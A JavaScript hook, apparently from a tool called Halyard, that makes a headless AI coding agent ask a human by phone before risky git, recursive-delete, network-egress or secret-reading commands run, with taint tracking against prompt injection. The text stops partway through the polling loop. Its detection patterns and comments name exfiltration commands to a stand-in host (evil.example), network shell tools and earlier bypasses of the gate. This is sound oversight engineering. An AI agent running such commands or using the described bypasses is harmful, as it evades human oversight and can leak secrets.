// PreToolUse hook: relays a mutating command to the phone for an approve/deny
// tap instead of letting it run unsupervised in a headless session.
//
// Wire it up by pointing your agent's PreToolUse hook at this file, with a
// matcher that names EVERY tool that can run a shell. See docs/SECURITY.md.
//
// Two rules govern everything below, and they pull in opposite directions on
// purpose:
//
//   Matching too eagerly costs one extra tap. Matching too narrowly costs the
//   whole backstop. So every ambiguous case resolves towards relaying.
//
//   This file must never crash without emitting a decision first. An unhandled
//   exception here is not something to gamble on as an allow.

const fs = require('fs');
const os = require('os');
const path = require('path');

// Resolved the same way the rest of Halyard resolves it, so a hook launched by
// an agent with a different cwd still finds the right install. HALYARD_DATA_DIR
// is set on the child by the watcher, which is the case that matters.
function dataDir() {
  if (process.env.HALYARD_DATA_DIR) return path.resolve(process.env.HALYARD_DATA_DIR);
  const home = os.homedir();
  if (process.platform === 'win32') return path.join(process.env.LOCALAPPDATA || path.join(home, 'AppData', 'Local'), 'halyard');
  if (process.platform === 'darwin') return path.join(home, 'Library', 'Application Support', 'halyard');
  if (process.env.XDG_STATE_HOME) return path.join(process.env.XDG_STATE_HOME, 'halyard');
  return path.join(home, '.local', 'state', 'halyard');
}

// 127.0.0.1, never localhost: the server binds loopback IPv4, and a localhost
// that resolves to ::1 first fails every relay with a connection error - which
// closes the command as 'bridge unreachable' rather than asking anyone.
// HALYARD_URL, when the watcher sets it, is the exact base the watcher itself
// talks to (src/watcher.js hookEnv) - it covers a bind to ::1 or to one
// specific address, where 127.0.0.1 is not listening at all. Sending the token
// there is no new exposure: the watcher already does, on every call.
const PORT = Number(process.env.HALYARD_PORT) || 4545;
const BASE = baseUrl(process.env, PORT);
function baseUrl(env, port) {
  const u = String(env.HALYARD_URL || '').replace(/\/+$/, '');
  return /^https?:\/\/[^\s/?#]+$/i.test(u) ? u : `http://127.0.0.1:${port}`;
}
const TOKEN_FILE = path.join(dataDir(), 'token.txt');
const TIMEOUT_MS = Number(process.env.HALYARD_RELAY_TIMEOUT_MS) || 5 * 60 * 1000;
const POLL_MS = 3000;

// Matches `git` anywhere in the command line, not just at the start, and skips
// over any options sitting between `git` and its subcommand. A start-anchored
// match let `git -C ../other push --force`, `git -c user.name=x commit` and
// `cd sub && git reset --hard origin/main` all slip through unrelayed - and under
// --permission-mode bypassPermissions, unrelayed means it simply runs. Matching too
// eagerly only costs an extra Approve tap; matching too narrowly costs the backstop.
//
// The leading boundary is a negative lookbehind rather than the old
// `(?:^|[;&|]\s*|\s)` alternation, which required the character before `git` to be
// whitespace, a chaining metacharacter, or start-of-string. A QUOTE is none of
// those, so `sh -c "git push --force"` and `powershell -Command "git reset --hard"`
// were not matched and ran with no relay at all. Both are the obvious way to write
// the command you would least want unrelayed. `(?<!\w)` accepts any non-word lead-in
// - quote, backtick, `$(`, `;` with no space - while still rejecting the words that
// merely end in git (`legit push`, `digit push`). It deliberately does not exclude
// `/`, so an absolute `/usr/bin/git push` still matches.
const MUTATING_GIT = /(?<!\w)git\s+(?:(?:-[cC]\s+\S+|--git-dir=\S+|--work-tree=\S+|--no-pager)\s+)*(add|commit|push|checkout|switch|branch|merge|rebase|reset|revert|tag|stash|restore|clean|cherry-pick|rm|mv)\b/;

// MUTATING_GIT is the candidate list; RISKY_GIT decides which of those calls is
// worth a phone tap. Waiting on the phone for every `git add` and `git commit`
// made the human's response time the bottleneck on every run, so the local,
// undoable verbs (add, commit, merge, rebase, revert, cherry-pick, tag, mv, a
// plain or --soft/--mixed reset, switch, `checkout -b`, branch create/rename,
// stash push/pop) run unasked: the reflog gets every one of them back. What still
// relays is what publishes or destroys work the reflog cannot restore:
//   push            - leaves the machine
//   clean, restore  - discard untracked / uncommitted work
//   reset --hard/--merge/--keep - discards uncommitted work
//   checkout        - anything but -b/-B, because `git checkout <x>` is a branch
//                     switch or a discard of <x>'s edits, and which one is not
//                     decidable from the text. Use `git switch` for the safe form.
//   switch -f/--discard-changes, branch -D/-f, stash drop/clear, rm -f
// Each git call is judged on its own arguments, cut at the next shell separator,
// so `git commit -m x && git push` still relays on the push. A separator inside a
// quoted argument cuts early; accepted, as the relay is a backstop against a
// careless run, not an adversarial one.
const GIT_CALL = new RegExp(MUTATING_GIT.source + String.raw`([^;&|\n]*)`, 'g');
const RISKY_GIT = {
  push: () => true,
  clean: () => true,
  restore: () => true,
  reset: (a) => /(?<!\S)--(?:hard|merge|keep)\b/.test(a),
  checkout: (a) => !/^\s*-[bB]\s+\S/.test(a),
  switch: (a) => /(?<!\S)(?:-[a-zA-Z]*f[a-zA-Z]*|--force|--discard-changes)\b/.test(a),
  branch: (a) => /(?<!\S)(?:-[a-zA-Z]*[Df][a-zA-Z]*|--force)\b/.test(a),
  stash: (a) => /^\s*(?:drop|clear)\b/.test(a),
  rm: (a) => /(?<!\S)(?:-[a-zA-Z]*f[a-zA-Z]*|--force)\b/.test(a),
};
function isRiskyGit(command) {
  for (const m of String(command).matchAll(GIT_CALL)) {
    const check = RISKY_GIT[m[1]];
    if (check && check(m[2] || '')) return true;
  }
  return false;
}

// Bash is not the only tool that runs a shell. The CLI Halyard launches
// (the Claude Code CLI) also ships a PowerShell tool, and a
// headless run reaching for that one instead sailed straight past this hook:
// tool_name !== 'Bash' returned passthrough, and under
// --permission-mode bypassPermissions "unrelayed" means "simply runs". So
// `git push --force` or `git reset --hard` via the PowerShell tool had no
// backstop at all, which is precisely the hole this file exists to close.
// Both tools carry the command line on tool_input.command, so one gate covers
// them. Keep this in sync with the matcher in your agent hook matcher - the
// matcher decides which tools reach this script in the first place, and a tool
// missing from THERE never gets as far as this list.
const RELAYED_TOOLS = new Set(['Bash', 'PowerShell']);

// Recursive deletion. git was the first thing worth a phone tap but it was never
// the only one: under bypassPermissions an unattended run can also empty a
// directory tree, and unlike a bad commit there is nothing to revert afterwards.
//
// Gated on RECURSION, not on force. `rm -f one-file.txt` is routine and blocking
// it would make the bridge tiring to use for no safety gained; `rm -rf <dir>` is
// the shape that removes something you did not enumerate. Same asymmetry argument
// as MUTATING_GIT, applied one notch tighter because the false-positive rate here
// would otherwise be much higher.
const DESTRUCTIVE_FS = new RegExp([
  // POSIX rm with -r/-R anywhere in a flag cluster (-rf, -fr, -Rf, -r) or --recursive.
  // Not `git rm`: that refuses to drop uncommitted edits without -f, so RISKY_GIT
  // judges it instead.
  String.raw`(?<!\w)(?<!\bgit\s+)rm\s+(?:-{1,2}[\w-]+\s+)*-[a-zA-Z]*[rR]`,
  String.raw`(?<!\w)(?<!\bgit\s+)rm\s+(?:-{1,2}[\w-]+\s+)*--recursive`,
  // cmd.exe tree deletes
  String.raw`(?<!\w)(?:rmdir|rd)\s+(?:[^\s]+\s+)*/[sS]`,
  String.raw`(?<!\w)del\s+(?:[^\s]+\s+)*/[sS]`,
  // PowerShell. Remove-Item and its aliases all take -Recurse, so the flag is the
  // reliable half of the match - `ri -Recurse` and `rm -Recurse` are the same call.
  String.raw`(?<!\w)(?:Remove-Item|ri|rmdir|rd|del|erase)\s[\s\S]*?-Recurse\b`,
  // Whole-volume operations. Rare enough that an unnecessary tap costs nothing and
  // catastrophic enough that a missed one costs everything.
  String.raw`(?<!\w)(?:mkfs(?:\.\w+)?|diskpart|Format-Volume|Clear-Disk)\b`,
  String.raw`(?<!\w)format\s+[a-zA-Z]:`,
].join('|'));

// Anything that pushes data or state off this machine. `git push` was already
// relayed; these are the other ways an unattended run publishes something - an
// HTTP request with a body, a file copied to a remote host, or a GitHub object
// created through `gh` (which never touches `git` and so sailed past the original
// matcher entirely, despite `gh pr create` being exactly as public as a push).
//
// Reads are deliberately NOT matched. A headless run fetching a page is the normal
// case and has no outward effect; the trigger is a request that carries a body, an
// upload, or a non-GET method.
// The verb is matched with \b, not \s. `curl\s` consumed the space after the
// command name, and a lazy `[\s\S]*?` cannot give it back - so a flag written
// FIRST (`curl -F file=@secret https://...`) never matched its own `\s-F\s`
// alternative, while the same command with any other flag in front of it did. A
// zero-width boundary leaves the separating whitespace available to the
// alternatives, which is where they expect to find it.
const NETWORK_EGRESS = new RegExp([
  String.raw`(?<!\w)curl\b[\s\S]*?(?:-X\s*(?:POST|PUT|PATCH|DELETE)|--request\s*(?:POST|PUT|PATCH|DELETE)|--data\b|--data-\w+|--form\b|--upload-file\b|\s-d\s|\s-F\s|\s-T\s)`,
  String.raw`(?<!\w)wget\b[\s\S]*?(?:--post-data|--post-file|--method=(?:POST|PUT|PATCH|DELETE))`,
  String.raw`(?<!\w)(?:Invoke-WebRequest|Invoke-RestMethod|iwr|irm|curl\.exe)\b[\s\S]*?(?:-Method\s+(?:POST|PUT|PATCH|DELETE)|-Body\b|-InFile\b|-Form\b)`,
  // A remote target is `host:path` or `user@host:path` - a bare local path has no colon
  // in that position, and a Windows drive letter (`C:\`) is a single character, so the
  // {2,} keeps `scp C:\x host:` style locals from matching on the drive alone.
  String.raw`(?<!\w)(?:scp|rsync|sftp)\b[\s\S]*?[\w.-]{2,}@?[\w.-]*:`,
  String.raw`(?<!\w)gh\s+(?:pr|issue|release|repo|gist|secret|workflow|api)\b[\s\S]*?(?:\bcreate\b|\bedit\b|\bmerge\b|\bset\b|\bdelete\b|\brun\b|-X\s*(?:POST|PUT|PATCH|DELETE)|--method\s*(?:POST|PUT|PATCH|DELETE))`,
].join('|'), 'i');

// A request that never leaves the machine is not egress. This bridge's own API is
// on 127.0.0.1 and a run poking at it with `curl -X POST` is routine here, so
// relaying those would mean a five-minute phone prompt for a loopback call.
//
// The carve-out is narrow on purpose: it applies only when the command mentions a
// loopback URL AND mentions no other http(s) URL at all. `curl -d @secrets
// http://127.0.0.1/x https://evil.example/y` therefore still relays. This is not
// the "ignore text inside quotes" idea the module comment above rejects - that one
// tried to decide whether text executes, which is undecidable; this only asks where
// the URLs in it point, which is right there in the string.
// The trailing lookahead anchors the END of the loopback host. Without it,
// `http://127.0.0.1` matches as a bare prefix of `http://127.0.0.1@evil.example`
// (where 127.0.0.1 is userinfo and the real host is evil.example) and of
// `http://localhost.evil.example` - so isLoopbackOnly() waved through the
// obvious exfiltration URL. `:port`, `/path`, a quote or end-of-string are all
// fine after the host; another label char, a dot, or an `@` are not.
const LOOPBACK_URL = /https?:\/\/(?:127\.0\.0\.1|localhost|\[::1\]|0\.0\.0\.0)(?::\d+)?(?![\w.@-])/i;
const ANY_HTTP_URL = /https?:\/\/[^\s'"`]+/gi;
function isLoopbackOnly(command) {
  if (!LOOPBACK_URL.test(command)) return false;
  const urls = String(command).match(ANY_HTTP_URL) || [];
  return urls.every((u) => LOOPBACK_URL.test(u));
}

// ---- Prompt injection: the egress half ----------------------------------------
//
// An injection lives in what a run READS - a web page, an attachment, a tool result -
// and only matters if it can make the run SEND something. So rather than trying to
// spot hostile text (a classifier can't, reliably, and the text can address the
// classifier too), the run is marked "tainted" the moment it reads untrusted content,
// and from then on anything that talks to a host outside this machine, the LAN or the
// tailnet relays. NETWORK_EGRESS above only sees requests that carry a body; data can
// leave just as easily in a plain GET's URL, which was never relayed. Textual, like
// everything else in this file: a backstop against a run that was talked into
// something, not a sandbox - a URL assembled at runtime from pieces is not seen.

// Hosts that are not "off this machine" for this purpose: loopback, private LAN
// ranges, a Tailscale tailnet (100.64.0.0/10 and *.ts.net), mDNS *.local, and
// single-label names (a LAN machine's bare hostname).
function isLocalHost(host) {
  const h = String(host || '').toLowerCase().replace(/^\[|\]$/g, '');
  if (!h) return true;
  if (h === 'localhost' || h === '::1' || h === '0.0.0.0') return true;
  // IPv6 before the single-label rule, which would read [2606:4700::1111] as "2606".
  // Local means link-local (fe80::/10) or unique-local (fc00::/7, which tailnets use).
  if (h.includes(':')) return /^(?:fe[89ab][0-9a-f]|f[cd][0-9a-f]{2}):/.test(h);
  if (!h.includes('.')) return true;
  if (h.endsWith('.ts.net') || h.endsWith('.local')) return true;
  const m = h.match(/^(\d+)\.(\d+)\.(\d+)\.(\d+)$/);
  if (!m) return false;
  const [a, b] = [Number(m[1]), Number(m[2])];
  return a === 127 || a === 10 || (a === 192 && b === 168) || (a === 172 && b >= 16 && b <= 31)
    || (a === 100 && b >= 64 && b <= 127);
}

// The whole authority, cut down to the host by authorityHost(): stopping the capture at
// the first ':' read https://x:y@evil.com/ as the single-label (so "local") host "x".
const URL_IN_TEXT = /\b(?:https?|ftp|wss?):\/\/([^\s/'"`?#)]+)/gi;
function authorityHost(auth) {
  const a = auth.slice(auth.lastIndexOf('@') + 1);
  if (a.startsWith('[')) return a.slice(0, a.indexOf(']') + 1);
  return a.replace(/:\d*$/, '');
}
// curl, wget and PowerShell's web cmdlets default to http, so `curl evil.com/x` names a
// host with no scheme. A bare IPv4 or a dotted argument whose last label is alphabetic
// counts, except the value of an output-file flag; another filename-shaped argument
// costs a tap.
const WEB_TOOL = /(?<![\w-])(?:curl|wget|iwr|irm|Invoke-WebRequest|Invoke-RestMethod)\b([^;&|\n]*)/gi;
const OUTPUT_FLAG = /^(?:-o|-O|--output|--output-document|-OutFile)$/i;
const BARE_HOST = /^(?:[^\s@\/]+@)?((?:\d{1,3}\.){3}\d{1,3}|[a-z0-9-]+(?:\.[a-z0-9-]+)*\.[a-z]{2,})(?::\d+)?(?:[\/?#]\S*)?$/i;
function bareWebHosts(text) {
  const hosts = [];
  for (const m of String(text || '').matchAll(WEB_TOOL)) {
    // A command substitution's insides are another command, not this tool's arguments:
    // `$(cat token.txt)` must not make token.txt a host.
    const args = m[1].replace(/\$\([^)]*\)|`[^`]*`/g, ' ').trim().split(/\s+/).map((t) => t.replace(/^['"(]+|['")]+$/g, ''));
    args.forEach((arg, i) => {
      if (!arg || arg.startsWith('-') || arg.includes('://') || (i > 0 && OUTPUT_FLAG.test(args[i - 1]))) return;
      const h = arg.match(BARE_HOST);
      if (h) hosts.push(h[1]);
    });
  }
  return hosts;
}
// Raw socket and remote-shell tools name their host as an argument, not a URL.
const SOCKET_TOOL = /(?<!\w)(?:nc|ncat|netcat|telnet|socat|ssh|scp|sftp|rsync)\b[^;&|\n]*?(?:@|\s)((?:\d{1,3}\.){3}\d{1,3}|[a-z0-9-]+(?:\.[a-z0-9-]+)+)(?=[\s:/]|$)/gi;

// Every non-local host a shell command line points at.
function outboundHosts(text) {
  const hosts = [];
  for (const m of String(text || '').matchAll(URL_IN_TEXT)) {
    const h = authorityHost(m[1]);
    if (!isLocalHost(h)) hosts.push(h.toLowerCase());
  }
  for (const h of bareWebHosts(text)) if (!isLocalHost(h)) hosts.push(h.toLowerCase());
  for (const m of String(text || '').matchAll(SOCKET_TOOL)) if (!isLocalHost(m[1])) hosts.push(m[1].toLowerCase());
  return hosts;
}

// What counts as a secret on a command line: a `.secrets` or Halyard `secrets`
// directory, this install's bearer token, or the secrets directory Halyard itself
// keeps (whatever the data dir is). Matching eagerly is fine here - on its own this
// decides nothing; it only relays alongside a non-local host.
function secretsRef(env = process.env) {
  const parts = [
    String.raw`(?:^|[\s'"\x60=(\/\\~$}])\.?secrets(?:[\/\\]|\b)`,
    String.raw`(?<![\w-])token\.txt\b`,
  ];
  const own = path.join(dataDir(), 'secrets');
  parts.push(own.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'));
  if (env.HALYARD_SECRETS_PATTERN) parts.push(env.HALYARD_SECRETS_PATTERN);
  try { return new RegExp(parts.join('|'), 'i'); } catch (e) { return new RegExp(parts.slice(0, 3).join('|'), 'i'); }
}
const SECRETS_REF = secretsRef();

// Taint or no taint: one command that both reads a secret and talks to the outside
// world is the shape of exfiltration whatever led up to it.
function isSecretEgress(command) {
  return SECRETS_REF.test(command) && outboundHosts(command).length > 0;
}

// A URL that looks like it is carrying data rather than naming a page: a long query
// string, or any long opaque token. Article slugs are hyphenated words, so they pass.
function isDataBearingUrl(url) {
  let u;
  try { u = new URL(String(url)); } catch (e) { return false; }
  if (u.search.length > 80) return true;
  return /[A-Za-z0-9+/=_%]{40,}/.test(u.pathname + u.search);
}

// What counts as reading untrusted content. Phone uploads land in <data>/uploads.
const FETCH_TOOLS = new Set(['WebFetch']);
const TAINT_TOOLS = new Set(['WebFetch', 'WebSearch']);
const UNTRUSTED_PATH = /[\/\\](?:uploads|Downloads)[\/\\]/i;
function taintSource(toolName, toolInput) {
  const input = toolInput || {};
  if (TAINT_TOOLS.has(toolName)) return toolName;
  if (/^mcp__/.test(String(toolName))) return toolName;
  if (toolName === 'Read' && UNTRUSTED_PATH.test(String(input.file_path || ''))) return `Read ${input.file_path}`;
  if (RELAYED_TOOLS.has(toolName)) {
    const hosts = outboundHosts(input.command);
    if (hosts.length) return `${toolName} fetch from ${hosts[0]}`;
    if (UNTRUSTED_PATH.test(String(input.command || ''))) return `${toolName} on an attachment or download`;
  }
  return null;
}
function readsSecret(toolName, toolInput) {
  const input = toolInput || {};
  if (toolName === 'Read') return SECRETS_REF.test(String(input.file_path || ''));
  if (RELAYED_TOOLS.has(toolName)) return SECRETS_REF.test(String(input.command || ''));
  return false;
}

// Per-session state in the temp dir: one small JSON file per run's session id.
const TAINT_DIR = process.env.HALYARD_TAINT_DIR || path.join(os.tmpdir(), 'halyard-taint');
function taintFile(sessionId) {
  const id = String(sessionId || '').replace(/[^A-Za-z0-9-]/g, '');
  return id ? path.join(TAINT_DIR, `${id}.json`) : null;
}
function readTaint(sessionId) {
  const f = taintFile(sessionId);
  if (!f) return {};
  try { return JSON.parse(fs.readFileSync(f, 'utf8')) || {}; } catch (e) { return {}; }
}
function updateTaint(sessionId, toolName, toolInput) {
  const f = taintFile(sessionId);
  if (!f) return {};
  const state = readTaint(sessionId);
  const source = taintSource(toolName, toolInput);
  const secret = readsSecret(toolName, toolInput);
  if ((!source || state.tainted) && (!secret || state.secretRead)) {
    // Keep a tainted session's file fresh while it is in use: the sweep below counts from
    // mtime, and a thread resumed days later still has the hostile text in its transcript.
    if (state.tainted) { try { const t = new Date(); fs.utimesSync(f, t, t); } catch (e) { /* best effort */ } }
    return state;
  }
  if (source && !state.tainted) { state.tainted = true; state.source = source; }
  if (secret) state.secretRead = true;
  try {
    fs.mkdirSync(TAINT_DIR, { recursive: true });
    fs.writeFileSync(f, JSON.stringify(state));
    // Opportunistic sweep: a session's file is worthless after a day or two.
    const cutoff = Date.now() - 2 * 86400 * 1000;
    for (const name of fs.readdirSync(TAINT_DIR)) {
      const p = path.join(TAINT_DIR, name);
      try { if (fs.statSync(p).mtimeMs < cutoff) fs.unlinkSync(p); } catch (e) { /* raced */ }
    }
  } catch (e) { /* best effort: an unwritable temp dir must not fail the tool call */ }
  return state;
}

function hostOf(url) {
  try { return new URL(url).hostname; } catch (e) { return ''; }
}

// The taint-aware rules, consulted after the plain ones. [ctx] is the session's state
// as it stood BEFORE this call, so the call that first reads untrusted content is not
// itself relayed - only what follows it.
const TAINT_RULES = [
  {
    name: 'secret-egress', label: 'command that reads a secret and talks to the network',
    test: (tool, text) => RELAYED_TOOLS.has(tool) && isSecretEgress(text),
  },
  {
    name: 'tainted-egress', label: (ctx) => `network request after this run read untrusted content (${ctx.source || 'web'})`,
    test: (tool, text, ctx) => RELAYED_TOOLS.has(tool) && !!ctx.tainted && outboundHosts(text).length > 0,
  },
  // A web fetch is how a research run reads, so it relays only when it could be
  // carrying data out: a data-shaped URL after taint, or any fetch once the run has
  // both read untrusted content and touched a secret.
  {
    name: 'tainted-egress', label: (ctx) => (ctx.secretRead
      ? 'web fetch after this run read both untrusted content and a secret'
      : `data-shaped web fetch after this run read untrusted content (${ctx.source || 'web'})`),
    test: (tool, text, ctx) => FETCH_TOOLS.has(tool) && !!ctx.tainted && !isLocalHost(hostOf(text))
      && (!!ctx.secretRead || isDataBearingUrl(text)),
  },
];

function matchTaintRule(toolName, command, ctx = {}, env = process.env) {
  const text = String(command || '').trim();
  if (!text) return null;
  const live = new Set(enabledRules(env).map((r) => r.name));
  const hit = TAINT_RULES.find((r) => live.has(r.name) && r.test(toolName, text, ctx));
  if (!hit) return null;
  return { name: hit.name, label: typeof hit.label === 'function' ? hit.label(ctx) : hit.label };
}

// Ordered because the first match names the question the phone is asked. Each rule
// carries the noun that goes into that question - "a git command" and "a recursive
// delete" want different amounts of thought from whoever is holding the phone.
// The two taint rules are listed here (with no test of their own) so that
// HALYARD_RELAY_RULES can name them like any other family.
const RELAY_RULES = [
  { name: 'git', label: 'git command', test: (cmd) => isRiskyGit(cmd) },
  { name: 'destructive-fs', label: 'recursive delete', test: (cmd) => DESTRUCTIVE_FS.test(cmd) },
  { name: 'network-egress', label: 'command that sends data off this machine', test: (cmd) => NETWORK_EGRESS.test(cmd) && !isLoopbackOnly(cmd) },
  { name: 'secret-egress', label: 'command that reads a secret and talks to the network', test: () => false },
  { name: 'tainted-egress', label: 'network request after this run read untrusted content', test: () => false },
];

// Returns the matched rule (or null), so the caller can say WHICH kind of thing it
// is relaying. shouldRelay stays a boolean wrapper because that is what the tests
// and the original call site read.
// Which rule families are live. Config, so someone for whom one category is
// pure noise can drop it without editing this file - but an UNSET or empty
// variable means ALL of them, never none. A misspelled or missing env var must
// not silently disarm the backstop; that is the one failure mode this file
// cannot be allowed to have, and it is the reason this is not written as a
// simple `(env.X || '').split(',')`.
function enabledRules(env = process.env) {
  const raw = env.HALYARD_RELAY_RULES;
  if (raw === undefined || raw === '') return RELAY_RULES;
  const want = new Set(String(raw).split(',').map((s) => s.trim()).filter(Boolean));
  if (!want.size) return RELAY_RULES;
  return RELAY_RULES.filter((r) => want.has(r.name));
}

function matchRelayRule(toolName, command, ctx = {}, env = process.env) {
  const cmd = String(command || '').trim();
  if (!cmd) return null;
  if (RELAYED_TOOLS.has(toolName)) {
    const rule = enabledRules(env).find((r) => r.test(cmd));
    if (rule) return rule;
  }
  return matchTaintRule(toolName, cmd, ctx, env);
}

// Split out from main() so test/smoke.js can exercise the tool gate and the
// command match together, rather than only the regex in isolation - the bug
// above was in the gate, not the regex, and a regex-only test could not see it.
function shouldRelay(toolName, command, ctx = {}) {
  return matchRelayRule(toolName, command, ctx) !== null;
}

// ---- Private-repo merges, optionally without a tap -----------------------------
//
// Opt-in (relay.privateMergeWithoutTap, which the watcher passes as
// HALYARD_RELAY_PRIVATE_MERGE=1): for someone whose own rule is "merging into a
// private repo needs no sign-off", the tap on `gh pr merge` there is pure cost.
// Public repos always relay: a merge there is publication.
//
// Narrow on purpose, failing towards the relay at every step:
//  - the whole command must be one `gh pr merge` (optionally after one `cd <dir> &&`)
//    with no shell metacharacters, quotes or substitutions in its arguments - so
//    nothing else can ride along on the exemption, and the repo it acts on is the
//    repo that gets checked;
//  - visibility is asked of GitHub itself (`gh repo view`, resolving the repo the
//    same way `gh pr merge` does), and anything but a clean PRIVATE answer relays;
//  - a run that has read untrusted content still relays (checked in main()), since
//    that is the run an injected instruction would be steering.
const PRIVATE_MERGE_SHAPE = /^(?:cd\s+([^\s;&|<>`$()'"]+)\s*&&\s*)?gh\s+pr\s+merge((?:\s+[\w./:#=@~+-]+)*)\s*$/;

// Returns { dir, repo } for a command the exemption may consider, or null. [repo] is
// owner/name when the command names one (--repo, -R, or a PR URL), else null, meaning
// "whatever gh resolves from [dir]".
function privateMergeTarget(command) {
  const m = PRIVATE_MERGE_SHAPE.exec(String(command || '').trim());
  if (!m) return null;
  const args = m[2].trim() ? m[2].trim().split(/\s+/) : [];
  const repos = new Set();
  for (let i = 0; i < args.length; i++) {
    const a = args[i];
    if (a === '--repo' || a === '-R') {
      if (i + 1 >= args.length) return null;
      repos.add(args[++i]);
    } else if (a.startsWith('--repo=')) {
      repos.add(a.slice('--repo='.length));
    } else if (/^https?:/i.test(a)) {
      const u = /^https:\/\/github\.com\/([\w.-]+\/[\w.-]+)\/pull\/\d+\/?$/i.exec(a);
      if (!u) return null;
      repos.add(u[1]);
    }
  }
  if (repos.size > 1) return null;
  const repo = repos.size ? [...repos][0] : null;
  if (repo !== null && !/^[\w.-]+\/[\w.-]+$/.test(repo)) return null;
  let dir = m[1] || null;
  if (dir && (dir === '~' || dir.startsWith('~/'))) dir = path.join(os.homedir(), dir.slice(1));
  return { dir, repo };
}

// Asks GitHub. [run] is injectable so the tests never touch the network.
function isPrivateRepoMerge(command, cwd, run = defaultGh) {
  const target = privateMergeTarget(command);
  if (!target) return false;
  const dir = target.dir ? path.resolve(cwd || process.cwd(), target.dir) : (cwd || process.cwd());
  const args = ['repo', 'view', ...(target.repo ? [target.repo] : []), '--json', 'visibility', '-q', '.visibility'];
  try {
    return String(run(args, dir) || '').trim() === 'PRIVATE';
  } catch (e) {
    return false;
  }
}

function defaultGh(args, cwd) {
  const r = require('child_process').spawnSync('gh', args, { cwd, encoding: 'utf8', timeout: 15000, windowsHide: true });
  if (r.status !== 0) throw new Error('gh repo view failed');
  return r.stdout;
}

// The whole exemption decision, pure apart from [run], so the tests can pin every
// condition: opted in, the plain egress rule (nothing riskier) matched, an untainted
// run, and GitHub saying PRIVATE.
function privateMergePasses(rule, command, ctx, cwd, env = process.env, run = defaultGh) {
  if (env.HALYARD_RELAY_PRIVATE_MERGE !== '1') return false;
  if (!rule || rule.name !== 'network-egress' || (ctx && ctx.tainted)) return false;
  return isPrivateRepoMerge(command, cwd, run);
}

// Permission modes in which Claude Code asks the human at the keyboard itself.
// In any of these the relay is pure cost: it re-asks a question the local session
// is already positioned to ask instantly, on a device the user may not even have
// to hand, and denies on a five-minute timeout if they don't.
//
// Deliberately an allow-list, not a deny-list of {bypassPermissions}. A mode name
// this file has never heard of - a future one, a typo, a payload from something
// that isn't Claude Code - lands on "relay", because the failure directions are
// not symmetric: an unnecessary relay costs one tap, a skipped one costs the
// whole backstop. Same reasoning as the MUTATING_GIT comment above.
const ATTENDED_MODES = new Set(['default', 'auto', 'acceptEdits', 'plan']);

// Why this exists at all: the relay is a backstop against an *unattended* run
// mutating a repo with no human in the loop - that is what the module comment
// says and what a loosened permission mode creates. It was
// firing in ordinary interactive sessions too, where it is not a backstop but an
// obstacle: MUTATING_GIT matches git-looking text anywhere on a command line,
// including inside a quoted string or a heredoc body, so writing a *file* that
// merely mentions `git commit` blocked for five minutes and then failed.
//
// The tempting fix - ignore matches inside quotes - is a genuine bypass, and must
// not be done: `sh -c "git push"` is quoted and still executes, as does
// `powershell -Command "git reset --hard"`. Sorting inert text from executed text
// on a shell command line is not decidable by pattern, so the eager match stays
// exactly as it is. What changes is *when* it is consulted.
//
// Two independent signals, either sufficient, because they fail in different
// ways: HALYARD_HEADLESS is set by the watcher on the process it starts
// and is definitive regardless of what the CLI reports, while permission_mode
// still covers any unattended run that did not come from Halyard.
function isUnattended(input, env = process.env) {
  if (env.HALYARD_HEADLESS === '1') return true;
  const mode = input && input.permission_mode;
  if (typeof mode !== 'string' || !mode) return true;
  return !ATTENDED_MODES.has(mode);
}

// Never process.exit() here. This script only ever reaches these functions from
// inside the async main(), with undici's fetch handles still open - exiting from
// there aborts the process on Windows (libuv "UV_HANDLE_CLOSING" assertion, exit
// code 0xC0000409), which Claude Code sees as a failed hook rather than a
// decision, and can truncate a piped stdout write. Setting exitCode and letting
// the loop drain naturally exits 0 and flushes stdout.
function decide(decision, reason) {
  process.stdout.write(JSON.stringify({
    hookSpecificOutput: {
      hookEventName: 'PreToolUse',
      permissionDecision: decision,
      permissionDecisionReason: reason,
    },
  }));
  process.exitCode = 0;
}

function passthrough() {
  process.exitCode = 0;
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function main() {
  const raw = fs.readFileSync(0, 'utf8');
  let input;
  try {
    input = JSON.parse(raw);
  } catch (e) {
    return passthrough();
  }

  // Cheapest gate first: an attended session needs no phone round-trip at all.
  if (!isUnattended(input)) return passthrough();

  const toolInput = input.tool_input || {};
  // The state before this call decides; this call's own reads are recorded for the next.
  const ctx = readTaint(input.session_id);
  updateTaint(input.session_id, input.tool_name, toolInput);
  const command = FETCH_TOOLS.has(input.tool_name) ? (toolInput.url || '') : (toolInput.command || '');
  const rule = matchRelayRule(input.tool_name, command, ctx);
  if (!rule) return passthrough();
  if (privateMergePasses(rule, command, ctx, input.cwd)) return passthrough();

  // Names what kind of thing it is, not just that something wants to run.
  // "a recursive delete" and "a git command" deserve different amounts of
  // thought from whoever is looking at the phone, and the command itself is
  // shown underneath either way.
  const answer = await askPhone({
    question: `A headless run wants to run a ${rule.label} (${input.tool_name}). Approve?`,
    command,
    rule: rule.name,
    cwd: input.cwd || null,
    missedLabel: rule.label,
  });
  return decide(answer.allow ? 'allow' : 'deny', answer.reason);
}

async function askPhone({ question, command, rule, cwd, missedLabel }) {
  let token;
  try {
    token = fs.readFileSync(TOKEN_FILE, 'utf8').trim();
  } catch (e) {
    return { allow: false, reason: 'Halyard token missing' };
  }

  let id;
  try {
    const askRes = await fetch(`${BASE}/api/ask?token=${token}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      // A socket that connects and then goes silent (server wedged on the run
      // lock) must not hang past the point where a decision is emitted - the
      // loop's TIMEOUT_MS only bounds the poll condition, not a single stuck
      // request.
      signal: AbortSignal.timeout(10000),
      body: JSON.stringify({
        question,
        command,
        options: ['Approve', 'Deny'],
        timeoutMs: TIMEOUT_MS,
        rule,
        cwd: cwd || null,
      }),
    });
    if (!askRes.ok) return { allow: false, reason: 'bridge rejected the relay question' };
    const askBody = await askRes.json();
    id = askBody.id;
  } catch (e) {
    return { allow: false, reason: 'Halyard unreachable' };
  }

  const deadline = Date.now() + TIMEOUT_MS;
  let why = 'no phone response within timeout';
  while (Date.now() < deadline) {
    const asked = Date.now();
    try {
      const stateRes = await fetch(`${BASE}/api/state?id=${encodeURIComponent(id)}&wait=25&token=${token}`, { signal: AbortSignal.timeout(35000) });
      const state = await stateRes.json();
      if (state.status === 'answered') {
        return state.answer === 'Approve'
          ? { allow: true, reason: 'approved via phone relay' }
          : { allow: false, reason: 'denied via phone relay' };
      }
